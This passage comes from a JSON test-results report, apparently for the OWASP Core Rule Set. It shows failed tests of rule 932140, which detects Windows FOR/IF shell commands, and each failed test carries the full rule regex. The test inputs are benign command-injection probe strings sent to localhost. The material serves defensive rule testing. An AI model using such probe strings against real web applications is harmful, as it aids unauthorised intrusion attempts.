      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920460 - Abnormal character escapes in request", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 124,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+%28%251%29%3D%3D%28LTRS%29+CD+C%3A%5CWORD%5CLTRS",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 125,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942180 - Detects basic SQL authentication bypass attempts 1/3", "phase=2 rule_id=942330 - Detects classic SQL injection probings 1/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942490 - Detects classic SQL injection probings 3/3", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 125,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+%22%251%22%3D%3D%22%22+goto+ERROR",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 126,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942100 - SQL Injection Attack Detected via libinjection", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 126,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+%28AA%29+%3D%3D+%28AA%29+echo+same",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 127,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 127,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+%5BAA%5D+%3D%3D+%5BAA%5D+echo+same",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 128,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942180 - Detects basic SQL authentication bypass attempts 1/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 128,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+%22A+A%22+%3D%3D+%22A+A%22+echo+same",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
